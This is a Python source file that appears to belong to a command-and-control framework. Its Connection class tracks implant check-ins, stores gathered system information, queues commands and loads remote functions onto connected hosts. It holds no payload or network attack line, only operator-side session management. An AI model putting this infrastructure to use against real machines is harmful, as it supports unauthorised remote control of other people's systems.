import time
import urllib.parse as parse

from collections import namedtuple
from connect import cli, color, util

class Connection():

    Job = namedtuple('Job', ['type', 'data'])

    def __init__(self, stager):
        self.job_queue = []
        self.connection_cli = None
        self.connection_id = util.generate_id()
        self.file_queue = []
        self.stager = stager
        self.stager_requested = time.time()
        self.last_checkin = time.time()
        self.loaded_functions = ['kill']
        self.menu_options = {}
        self.status = 'pending'
        self.system_information = {}

    def __str__(self):
        internet_addr = self.system_information['ip']
        return '{:<13} {:<18} {:<13} {:<16} {:<13}'.format(self.connection_id, internet_addr, self.stager.format,  self.status, self.get_current_time(self.last_checkin))

    def check_in(self):
        ip = self.system_information['ip']
        if self.status != 'connected':
            self.status = 'connected'
            color.success(f'Successful connection ({ip})')
        self.last_checkin = time.time()
        return 0, 'Success'

    def disconnected(self):
        if time.time() - self.last_checkin >= (60*30):
            self.status = 'disconnected'
            return True
        return False

    def discover_options(self):
        for _ , function in self.stager.functions.items():
            self.menu_options[function.name] = util.MenuOption(self.execute, f'{function.description} (unloaded).', f'{function.option_type}', color.unloaded, True)
        self.connection_cli.update_options(self.menu_options)
        return 0, 'Success'

    def execute(self, option):
        if option[0] not in self.loaded_functions:
            function = self.stager.functions[option[0]]
            self.load_function(function)
        self.job_queue.append(self.Job('command', option))
        return 0, 'Success'

    def information(self):
        color.header('System Information')
        for key, value in self.system_information.items():
            color.normal(f'{key} : {value}')
        color.normal('')
        return 0, 'Success'

    def interact(self):
        self.menu_options['information'] = util.MenuOption(self.information, 'Displays gathered system information.', 'Connection Options', color.normal, False)
        self.menu_options['kill'] = util.MenuOption(self.execute, 'Kills the current connection.', 'Connection Options', color.normal, True)
        self.menu_options['loaded'] = util.MenuOption(self.loaded, 'Displays loaded functions.', 'Connection Options', color.normal, False)
        self.menu_options['unload'] = util.MenuOption(self.unload_function, 'Unloads a loaded function.', 'Connection Options', color.normal, True)
        internet_addr = self.system_information['ip']
        self.connection_cli = cli.CommandLine(f'connection ({internet_addr}) :')
        self.discover_options()
        self.connection_cli.run()
        return 0, 'Success'

    def loaded(self):
        if not self.loaded_functions:
            return -1, 'There are no loaded functions.'
        color.header('Loaded Functions')
        for function in self.loaded_functions:
            color.normal(f' - {function}')
        color.normal('')
        return 0, 'Success'

    def load_function(self, function):
        self.job_queue.append(self.Job('function', f'{function.name}'))
        self.loaded_functions.append(function.name)
        self.menu_options[function.name] = util.MenuOption(self.execute, f'{function.description}.', f'{function.option_type}', color.normal, True)
        self.connection_cli.update_options(self.menu_options)
        if not function.dependencies:
            return
        for function in function.dependencies:
            if not function.name in self.loaded_functions:
                self.load_function(function)

    def stale(self):
        if time.time() - self.last_checkin >= 60:
            self.status = 'stale'
            return True
        return False

    def unload_function(self, input):
        if len(input) == 1:
            return -1, 'Please provide a function.'
        function_name = input[1].lower()
        if function_name == 'kill':
            return -2, 'No.'
        if function_name not in self.stager.functions.keys():
            return -1, 'This function does not exist.'
        if function_name not in self.loaded_functions:
            return -1, 'This function is not loaded.'
        function = self.stager.functions[function_name]
        self.loaded_functions.remove(function.name)
        self.menu_options[function.name] = util.MenuOption(self.execute, f'{function.description} (unloaded).', f'{function.option_type}', color.unloaded, True)
        self.connection_cli.update_options(self.menu_options)
        color.information(f'Successfully unloaded: {function.name}.')
        return 0, 'Success'

    @staticmethod
    def get_current_time(seconds):
        return time.strftime('%H:%M:%S', time.localtime(seconds))
